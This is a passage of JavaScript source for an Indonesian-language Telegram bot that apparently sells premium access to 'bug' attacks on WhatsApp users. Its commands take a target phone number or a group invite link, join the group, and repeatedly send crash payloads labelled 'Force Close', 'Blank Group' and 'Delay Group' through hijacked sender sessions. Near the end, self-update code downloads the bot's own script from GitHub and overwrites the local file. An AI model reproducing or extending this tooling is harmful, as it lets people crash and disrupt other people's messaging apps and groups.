▹ Date : ${date}</blockquote>`,
      parse_mode: "HTML", 
      reply_markup: {
        inline_keyboard: [
          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });

    setTimeout(async () => {
      try {

        for (let i = 0; i <50; i++) {
          await stickerUi(sock, target);
          await sleep(1500)
        }

        console.log(`[SUCCESS] Xiosr ${formattedNumber}`)

      } catch (err) {
        console.log("Xiosr error:", err)
      }
    }, 100)

  } catch (err) {
    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
    console.log("Xiosr ERROR:", err)
  }
});

bot.onText(/\/Catally(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id
    const senderId = msg.from.id
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"

    const randomImage = getRandomImage()

    // cek premium
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM

User : ${username}
Status : Premium Required

Hubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/Pinnxzy" }]
          ]
        }
      });
    }

    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /Catally 628xxxx")
    }

    const targetNumber = match[1]
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
    const target = `${formattedNumber}@s.whatsapp.net`
    const date = getCurrentDate()

    const cooldown = checkCooldown(senderId)
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
    }

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
    }

    await bot.sendPhoto(chatId, randomImage, {
      caption: `<blockquote>⬡═—⊱「 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄<tg-emoji emoji-id="6003746869669270383">✅</tg-emoji> 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Force Close ( No Work All Divice)
▹ Status : Success
▹ Date : ${date}</blockquote>`,
      parse_mode: "HTML", 
      reply_markup: {
        inline_keyboard: [
          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });

    setTimeout(async () => {
      try {

        for (let i = 0; i <50; i++) {
          await X7Forclose(sock, target)
        }

        console.log(`[SUCCESS] Catally ${formattedNumber}`)

      } catch (err) {
        console.log("Catally error:", err)
      }
    }, 100)

  } catch (err) {
    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
    console.log("Catally ERROR:", err)
  }
});

bot.onText(/\/Craryz(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id
    const senderId = msg.from.id
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"

    const randomImage = getRandomImage()

    // cek premium
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM

User : ${username}
Status : Premium Required

Hubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/Pinnxzy" }]
          ]
        }
      });
    }

    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /Craryz 628xxxx")
    }

    const targetNumber = match[1]
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
    const target = `${formattedNumber}@s.whatsapp.net`
    const date = getCurrentDate()

    const cooldown = checkCooldown(senderId)
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
    }

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
    }

    await bot.sendPhoto(chatId, randomImage, {
      caption: `<blockquote>⬡═—⊱「 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄<tg-emoji emoji-id="6003746869669270383">✅</tg-emoji> 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Force Close ( No Work All Divice)
▹ Status : Success
▹ Date : ${date}</blockquote>`,
      parse_mode: "HTML", 
      reply_markup: {
        inline_keyboard: [
          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });

    setTimeout(async () => {
      try {

        for (let i = 0; i <50; i++) {
          await X7ForcloseCombo(sock, target)
        }

        console.log(`[SUCCESS] Craryz ${formattedNumber}`)

      } catch (err) {
        console.log("Craryz error:", err)
      }
    }, 100)

  } catch (err) {
    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
    console.log("Craryz ERROR:", err)
  }
});

bot.onText(/\/Crazzy(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id
    const senderId = msg.from.id
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"

    const randomImage = getRandomImage()

    // cek premium
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM

User : ${username}
Status : Premium Required

Hubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/Pinnxzy" }]
          ]
        }
      });
    }

    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /Crazzy 628xxxx")
    }

    const targetNumber = match[1]
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
    const target = `${formattedNumber}@s.whatsapp.net`
    const date = getCurrentDate()

    const cooldown = checkCooldown(senderId)
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
    }

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
    }

    await bot.sendPhoto(chatId, randomImage, {
      caption: `<blockquote>⬡═—⊱「 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄<tg-emoji emoji-id="6003746869669270383">✅</tg-emoji> 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Force Close Click 
▹ Status : Success
▹ Date : ${date}</blockquote>`,
      parse_mode: "HTML", 
      reply_markup: {
        inline_keyboard: [
          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });

    setTimeout(async () => {
      try {

        for (let i = 0; i < 5; i++) {
          await X7Klik(sock, target);
          await sleep(1500)
        }

        console.log(`[SUCCESS] ForceInvinity ${formattedNumber}`)

      } catch (err) {
        console.log("ForceInvinity error:", err)
      }
    }, 100)

  } catch (err) {
    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
    console.log("delay ERROR:", err)
  }
});

bot.onText(/\/zombies(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id
    const senderId = msg.from.id
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"

    const randomImage = getRandomImage()

    // cek premium
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM

User : ${username}
Status : Premium Required

Hubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/Pinnxzy" }]
          ]
        }
      });
    }

    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /zombies 628xxxx")
    }

    const targetNumber = match[1]
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
    const target = `${formattedNumber}@s.whatsapp.net`
    const date = getCurrentDate()

    const cooldown = checkCooldown(senderId)
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
    }

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
    }

    await bot.sendPhoto(chatId, randomImage, {
      caption: `<blockquote>⬡═—⊱「 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄<tg-emoji emoji-id="6003746869669270383">✅</tg-emoji> 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Force Close Click 
▹ Status : Success
▹ Date : ${date}</blockquote>`,
      parse_mode: "HTML", 
      reply_markup: {
        inline_keyboard: [
          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });

    setTimeout(async () => {
      try {

        for (let i = 0; i < 50; i++) {
          await Woam(target);
          await sleep(1500)
        }

        console.log(`[SUCCESS] ForceInvinity ${formattedNumber}`)

      } catch (err) {
        console.log("ForceInvinity error:", err)
      }
    }, 100)

  } catch (err) {
    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
    console.log("delay ERROR:", err)
  }
});

bot.onText(/\/Cursed(?:\s+(https:\/\/chat\.whatsapp\.com\/[a-zA-Z0-9]+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id
    const senderId = msg.from.id
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"
    const randomImage = getRandomImage()

    // 1. Cek Premium
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM\n\nUser : ${username}\nStatus : Premium Required\n\nHubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "CONTACT OWNER", url: "https://t.me/Pinnxzy" }]]
        }
      });
    }

    // 2. Validasi Link Grup
    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "❌ Format salah!\nContoh: `/Cursed https://chat.whatsapp.com/KODE_GRUP`", { parse_mode: "Markdown" })
    }

    const groupLink = match[1]
    const inviteCode = groupLink.split('whatsapp.com/')[1] // Mengambil kode invite
    const date = getCurrentDate()

    // 3. Cek Cooldown & Session
    const cooldown = checkCooldown(senderId)
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
    }

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
    }

    // 4. Response Telegram
    await bot.sendPhoto(chatId, randomImage, {
      caption: `<blockquote>⬡═—⊱「 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐆͢𝐑͢𝐎͢𝐔͢𝐏 」⊰—═⬡\n
      ▹ Type Bug : Fc Click Group
      ▹ Type : Group Link Attack\n
      ▹ Code : ${inviteCode}\n
      ▹ Status : Executing...\n
      ▹ Date : ${date}</blockquote>`,
      parse_mode: "HTML", 
      reply_markup: {
        inline_keyboard: [[{ text: "CHECK GROUP", url: groupLink }]]
      }
    });

    // 5. Eksekusi WhatsApp (Async Process)
    setTimeout(async () => {
      try {
        // Ambil session pertama yang tersedia
        const [sock] = sessions.values() 

        // Join ke grup terlebih dahulu menggunakan kode invite
        const groupMetadata = await sock.groupAcceptInvite(inviteCode)
        const groupJid = groupMetadata // ID Grup biasanya berbentuk '123456@g.us'

        if (groupJid) {
          for (let i = 0; i < 5; i++) {
            // Gunakan fungsi bug anda (pastikan fungsi tersebut support JID grup)
            await X7Klik(sock, groupJid); 
            await sleep(1500)
          }
          console.log(`[SUCCESS] Group Attack: ${groupJid}`)
        }

      } catch (err) {
        console.log("Group Attack Error:", err)
        bot.sendMessage(chatId, "❌ Gagal join grup atau link tidak valid.")
      }
    }, 100)

  } catch (err) {
    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
    console.log("fc gb ERROR:", err)
  }
});

bot.onText(/\/Light(?:\s+(https:\/\/chat\.whatsapp\.com\/[a-zA-Z0-9]+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id
    const senderId = msg.from.id
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"
    const randomImage = getRandomImage()

    // 1. Cek Premium
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM\n\nUser : ${username}\nStatus : Premium Required\n\nHubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "CONTACT OWNER", url: "https://t.me/pinzyoffc" }]]
        }
      });
    }

    // 2. Validasi Link Grup
    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "❌ Format salah!\nContoh: `/Light https://chat.whatsapp.com/KODE_GRUP`", { parse_mode: "Markdown" })
    }

    const groupLink = match[1]
    const inviteCode = groupLink.split('whatsapp.com/')[1] // Mengambil kode invite
    const date = getCurrentDate()

    // 3. Cek Cooldown & Session
    const cooldown = checkCooldown(senderId)
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
    }

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
    }

    // 4. Response Telegram
    await bot.sendPhoto(chatId, randomImage, {
      caption: `<blockquote>⬡═—⊱「 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐆͢𝐑͢𝐎͢𝐔͢𝐏 」⊰—═⬡\n
      ▹ Type Bug : Fc Click Group
      ▹ Type : Group Link Attack\n
      ▹ Status : Executing...\n
      ▹ Date : ${date}</blockquote>`,
      parse_mode: "HTML", 
      reply_markup: {
        inline_keyboard: [[{ text: "CHECK GROUP", url: groupLink }]]
      }
    });

    // 5. Eksekusi WhatsApp (Async Process)
    setTimeout(async () => {
      try {
        // Ambil session pertama yang tersedia
        const [sock] = sessions.values() 

        // Join ke grup terlebih dahulu menggunakan kode invite
        const groupMetadata = await sock.groupAcceptInvite(inviteCode)
        const groupJid = groupMetadata // ID Grup biasanya berbentuk '123456@g.us'

        if (groupJid) {
          for (let i = 0; i < 50; i++) {
            // Gunakan fungsi bug anda (pastikan fungsi tersebut support JID grup)
            await tesyu(sock, groupJid);
            await sleep(1500)
          }
          console.log(`[SUCCESS] Group Attack: ${groupJid}`)
        }

      } catch (err) {
        console.log("Group Attack Error:", err)
        bot.sendMessage(chatId, "❌ Gagal join grup atau link tidak valid.")
      }
    }, 100)

  } catch (err) {
    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
    console.log("ERROR:", err)
  }
});

bot.onText(/\/Empire(?:\s+(https:\/\/chat\.whatsapp\.com\/[a-zA-Z0-9]+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id
    const senderId = msg.from.id
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"
    const randomImage = getRandomImage()

    // 1. Cek Premium
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM\n\nUser : ${username}\nStatus : Premium Required\n\nHubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "CONTACT OWNER", url: "https://t.me/pinzyoffc" }]]
        }
      });
    }

    // 2. Validasi Link Grup
    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "❌ Format salah!\nContoh: `/Empire https://chat.whatsapp.com/KODE_GRUP`", { parse_mode: "Markdown" })
    }

    const groupLink = match[1]
    const inviteCode = groupLink.split('whatsapp.com/')[1] // Mengambil kode invite
    const date = getCurrentDate()

    // 3. Cek Cooldown & Session
    const cooldown = checkCooldown(senderId)
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
    }

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
    }

    // 4. Response Telegram
    await bot.sendPhoto(chatId, randomImage, {
      caption: `<blockquote>⬡═—⊱「 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐆͢𝐑͢𝐎͢𝐔͢𝐏 」⊰—═⬡\n
      ▹ Type : Group Link Attack\n
      ▹ Type Bug : Blank Group 
      ▹ Code : ${inviteCode}\n
      ▹ Status : Executing...\n
      ▹ Date : ${date}</blockquote>`,
      parse_mode: "HTML", 
      reply_markup: {
        inline_keyboard: [[{ text: "CHECK GROUP", url: groupLink }]]
      }
    });

    // 5. Eksekusi WhatsApp (Async Process)
    setTimeout(async () => {
      try {
        // Ambil session pertama yang tersedia
        const [sock] = sessions.values() 

        // Join ke grup terlebih dahulu menggunakan kode invite
        const groupMetadata = await sock.groupAcceptInvite(inviteCode)
        const groupJid = groupMetadata // ID Grup biasanya berbentuk '123456@g.us'

        if (groupJid) {
          for (let i = 0; i < 10; i++) {
            // Gunakan fungsi bug anda (pastikan fungsi tersebut support JID grup)
            await NvXStuckLogo(sock, groupJid);
          }
          console.log(`[SUCCESS] Group Attack: ${groupJid}`)
        }

      } catch (err) {
        console.log("Group Attack Error:", err)
        bot.sendMessage(chatId, "❌ Gagal join grup atau link tidak valid.")
      }
    }, 100)

  } catch (err) {
    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
    console.log("blank gb ERROR:", err)
  }
});

bot.onText(/\/Bloddy(?:\s+(https:\/\/chat\.whatsapp\.com\/[a-zA-Z0-9]+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id
    const senderId = msg.from.id
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"
    const randomImage = getRandomImage()

    // 1. Cek Premium
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM\n\nUser : ${username}\nStatus : Premium Required\n\nHubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "CONTACT OWNER", url: "https://t.me/pinzyoffc" }]]
        }
      });
    }

    // 2. Validasi Link Grup
    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "❌ Format salah!\nContoh: `/Bloddy https://chat.whatsapp.com/KODE_GRUP`", { parse_mode: "Markdown" })
    }

    const groupLink = match[1]
    const inviteCode = groupLink.split('whatsapp.com/')[1] // Mengambil kode invite
    const date = getCurrentDate()

    // 3. Cek Cooldown & Session
    const cooldown = checkCooldown(senderId)
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
    }

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
    }

    // 4. Response Telegram
    await bot.sendPhoto(chatId, randomImage, {
      caption: `<blockquote>⬡═—⊱「 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐆͢𝐑͢𝐎͢𝐔͢𝐏 」⊰—═⬡\n
      ▹ Type : Group Link Attack\n
      ▹ Type Bug : Delay Group
      ▹ Code : ${inviteCode}\n
      ▹ Status : Executing...\n
      ▹ Date : ${date}</blockquote>`,
      parse_mode: "HTML", 
      reply_markup: {
        inline_keyboard: [[{ text: "CHECK GROUP", url: groupLink }]]
      }
    });

    // 5. Eksekusi WhatsApp (Async Process)
    setTimeout(async () => {
      try {
        // Ambil session pertama yang tersedia
        const [sock] = sessions.values() 

        // Join ke grup terlebih dahulu menggunakan kode invite
        const groupMetadata = await sock.groupAcceptInvite(inviteCode)
        const groupJid = groupMetadata // ID Grup biasanya berbentuk '123456@g.us'

        if (groupJid) {
          for (let i = 0; i < 50; i++) {
            // Gunakan fungsi bug anda (pastikan fungsi tersebut support JID grup)
            await DelayTrackingHard(sock, groupJid);
          }
          console.log(`[SUCCESS] Group Attack: ${groupJid}`)
        }

      } catch (err) {
        console.log("Group Attack Error:", err)
        bot.sendMessage(chatId, "❌ Gagal join grup atau link tidak valid.")
      }
    }, 100)

  } catch (err) {
    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
    console.log("Delay Gb ERROR:", err)
  }
});

bot.onText(/\/cekemoji/, async (msg) => {
  const chatId = msg.chat.id;
  const targetMsg = msg.reply_to_message;

  // 1. Cek jika tidak mereply pesan apa pun
  if (!targetMsg) {
    return bot.sendMessage(
      chatId,
      `<tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> <b>Reply pesan yang berisi emoji premium.</b>

<b>Contoh:</b>
- User kirim emoji premium
- Reply emoji tersebut dengan command <code>/cekemoji</code>`,
      { parse_mode: "HTML" }
    );
  }

  const emojis = [];

  // 2. Ambil emoji dari teks biasa
  if (targetMsg.entities) {
    targetMsg.entities.forEach((entity) => {
      if (entity.type === "custom_emoji") {
        emojis.push({ id: entity.custom_emoji_id });
      }
    });
  }

  // 3. Ambil emoji dari caption (foto/video)
  if (targetMsg.caption_entities) {
    targetMsg.caption_entities.forEach((entity) => {
      if (entity.type === "custom_emoji") {
        emojis.push({ id: entity.custom_emoji_id });
      }
    });
  }

  // 4. Jika tidak ditemukan emoji premium
  if (emojis.length === 0) {
    return bot.sendMessage(
      chatId,
      `<tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> <b>Tidak ada custom emoji terdeteksi.</b>

Gunakan command ini dengan reply ke pesan yang berisi emoji premium Telegram.`,
      { parse_mode: "HTML" }
    );
  }

  // 5. Susun teks hasil
  let result = `<blockquote><b><tg-emoji emoji-id="5289594654176606759">✨</tg-emoji><tg-emoji emoji-id="5287412269624358128">✨</tg-emoji><tg-emoji emoji-id="5289864047410314050">✨</tg-emoji><tg-emoji emoji-id="5290014366970706894">✨</tg-emoji>
╔══════════════════╗
   CUSTOM EMOJI FOUND
╚══════════════════╝</b></blockquote>\n`;

  emojis.forEach((e, i) => {
    // Gunakan &lt; dan &gt; agar kode HTML-nya muncul sebagai teks dan tidak ter-render
    result += `<blockquote><b><tg-emoji emoji-id="5334890573281114250">✨</tg-emoji> Id Emoji ${i + 1}</b>
<code>${e.id}</code>
<tg-emoji emoji-id="5085022089103016925">✨</tg-emoji> <b>Format Pakai:</b>
<code>&lt;tg-emoji emoji-id="${e.id}"&gt;✨&lt;/tg-emoji&gt;</code></blockquote>\n`;
  });

  result += `<blockquote><b>━━━━━━━━━━━━━━━━━━━━</b>
<b>Total Emoji:</b> ${emojis.length}</blockquote>`;

  // 6. Kirim hasil
  bot.sendMessage(chatId, result, { parse_mode: "HTML" });
});

bot.onText(/\/update/, async (msg) => {
    const chatId = msg.chat.id;
    const repoRaw = "https://raw.githubusercontent.com/DAFARELXP/Xylent-Empire/main/empire.js";
    const localFilePath = path.join(__dirname, './empire.js');
    const backupPath = path.join(__dirname, './empire.js.bak');

    const statusMsg = await bot.sendMessage(chatId, "🔍 *Mengecek pembaruan sistem...*", { parse_mode: "Markdown" });

    try {
        // 1. Fetch data dari GitHub
        const response = await axios.get(repoRaw, { timeout: 10000 });
        const newData = response.data;

        if (!newData || typeof newData !== 'string') {
            throw new Error("File dari server kosong atau tidak valid.");
        }

        // 2. Cek apakah ada perubahan (opsional tapi disarankan)
        const currentData = fs.readFileSync(localFilePath, 'utf8');
        if (newData === currentData) {
            return bot.editMessageText("Sistem sudah dalam versi terbaru. ✅", {
                chat_id: chatId,
                message_id: statusMsg.message_id
            });
        }

        // 3. Backup file lama untuk keamanan
        fs.copyFileSync(localFilePath, backupPath);

        // 4. Tulis file baru
        fs.writeFileSync(localFilePath, newData);

        await bot.editMessageText(
            "🚀 *Update Berhasil!*\n\nSistem akan melakukan restart otomatis dalam 3 detik untuk menerapkan perubahan.",
            { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "Markdown" }
        );

        // Kasih jeda sedikit sebelum exit agar pesan terkirim
        setTimeout(() => {
            process.exit(); 
        }, 3000);

    } catch (e) {
        console.error("Update Error:", e.message);
        
        // Jika terjadi error saat menulis, coba kembalikan dari backup jika tersedia
        if (fs.existsSync(backupPath)) {
            fs.copyFileSync(backupPath, localFilePath);
        }

        bot.sendMessage(chatId, `❌ *Update Gagal!*\nTerjadi kesalahan: \`${e.message}\``, { parse_mode: "Markdown" });
    }
});

const CONFIG = {
  OWNER_ID      : 8768626313,                   // Telegram user ID owner
  RAW_URL       : "https://raw.githubusercontent.com/DAFARELXP/Xylent-Empire/main/empire.js",
  COMMITS_API   : "https://api.github.com/repos/DAFARELXP/Xylent-Empire/commits?path=empire.js&per_page=5",
  LOCAL_FILE    : path.join(__dirname, "empire.js"), // path simpan file hasil update
  INTERVAL_MIN  : 5,                           // cek setiap X menit
};

let autoUpdateEnabled = false;
let checkIntervalID   = null;
let lastKnownSHA      = null;

// ── HELPER: HTTP GET ──────────────────────────────────────────
function httpGet(url) {
  return new Promise((resolve, reject) => {
    https.get(url, { headers: { "User-Agent": "XylentEmpireBot" } }, (res) => {
      let body = "";
      res.on("data", (chunk) => (body += chunk));
      res.on("end", () => resolve({ status: res.statusCode, body }));
    }).on("error", reject);
  });
}

// ── AMBIL SHA COMMIT TERBARU ──────────────────────────────────
async function getLatestSHA() {
  const { body } = await httpGet(CONFIG.COMMITS_API);
  const commits  = JSON.parse(body);
  if (!Array.isArray(commits) || !commits[0]) throw new Error("Commit list kosong");
  return commits[0].sha;
}

// ── DOWNLOAD FILE TERBARU ─────────────────────────────────────
async function downloadFile() {
  const { status, body } = await httpGet(CONFIG.RAW_URL);
  if (status !== 200) throw new Error(`HTTP ${status}`);
  fs.writeFileSync(CONFIG.LOCAL_FILE, body, "utf-8");
}

// ── CEK & PROSES UPDATE ───────────────────────────────────────
async function checkUpdate(chatId = null) {
  try {
    const sha     = await getLatestSHA();
    const isFirst = lastKnownSHA === null;

    if (sha === lastKnownSHA) {
      // Tidak ada update
      if (chatId) {
        bot.sendMessage(chatId,
          `✅ *Tidak ada update baru.*\n` +
          `🔑 SHA: \`${sha.slice(0, 7)}\`\n` +
          `⏰ ${new Date().toLocaleString("id-ID")}`,
          { parse_mode: "Markdown" }
        );
      }
      return;
    }

    // Ada update baru (atau pertama kali)
    const prevSHA   = lastKnownSHA;
    lastKnownSHA    = sha;

    if (!isFirst) {
      // Download file baru
      await downloadFile();

      const msg =
        `🔄 *AUTO-UPDATE BERHASIL!*\n\n` +
        `📦 File  : \`empire.js\`\n` +
        `🆕 SHA Baru : \`${sha.slice(0, 7)}\`\n` +
        `🔙 SHA Lama : \`${prevSHA.slice(0, 7)}\`\n` +
        `⏰ Waktu : ${new Date().toLocaleString("id-ID")}\n\n` +
        `📥 File sudah diperbarui di: \`${CONFIG.LOCAL_FILE}\`\n` +
        `♻️ Restart bot untuk menerapkan perubahan.`;

      // Kirim ke owner
      bot.sendMessage(CONFIG.OWNER_ID, msg, { parse_mode: "Markdown" });

      // Kalau cek manual dari chat lain
      if (chatId && chatId !== CONFIG.OWNER_ID) {
        bot.sendMessage(chatId, msg, { parse_mode: "Markdown" });
      }

    } else {
      // Pertama kali: set baseline SHA saja
      console.log(`[AutoUpdate] Baseline SHA: ${sha.slice(0, 7)}`);
      if (chatId) {
        bot.sendMessage(chatId,
          `📌 *Baseline SHA disimpan.*\n🔑 SHA: \`${sha.slice(0, 7)}\``,
          { parse_mode: "Markdown" }
        );
      }
    }

  } catch (err) {
    console.error("[AutoUpdate] Error:", err.message);
    const errMsg = `❌ *Gagal cek update:*\n\`${err.message}\``;
    bot.sendMessage(CONFIG.OWNER_ID, errMsg, { parse_mode: "Markdown" });
    if (chatId && chatId !== CONFIG.OWNER_ID) {
      bot.sendMessage(chatId, errMsg, { parse_mode: "Markdown" });
    }
  }
}

// ── AKTIFKAN AUTO-UPDATE ──────────────────────────────────────
async function startAutoUpdate(chatId) {
  if (autoUpdateEnabled) {
    return bot.sendMessage(chatId, "⚠️ Auto-Update sudah *aktif*.", { parse_mode: "Markdown" });
  }

  autoUpdateEnabled = true;

  // Set baseline dulu
  await checkUpdate(null);

  // Mulai interval
  const ms       = CONFIG.INTERVAL_MIN * 60 * 1000;
  checkIntervalID = setInterval(() => checkUpdate(null), ms);

  bot.sendMessage(chatId,
    `✅ *Auto-Update DIAKTIFKAN*\n\n` +
    `🔍 Interval  : setiap *${CONFIG.INTERVAL_MIN} menit*\n` +
    `📡 Source    : GitHub DAFARELXP/Xylent-Empire\n` +
    `💾 Simpan ke : \`${CONFIG.LOCAL_FILE}\`\n` +
    `🔑 SHA Saat Ini: \`${lastKnownSHA ? lastKnownSHA.slice(0, 7) : "unknown"}\`\n\n` +
    `Bot akan otomatis notif ke owner jika ada file baru diupload.`,
    { parse_mode: "Markdown" }
  );
}

// ── MATIKAN AUTO-UPDATE ───────────────────────────────────────
function stopAutoUpdate(chatId) {
  if (!autoUpdateEnabled) {
    return bot.sendMessage(chatId, "⚠️ Auto-Update sudah *mati*.", { parse_mode: "Markdown" });
  }

  clearInterval(checkIntervalID);
  checkIntervalID   = null;
  autoUpdateEnabled = false;

  bot.sendMessage(chatId,
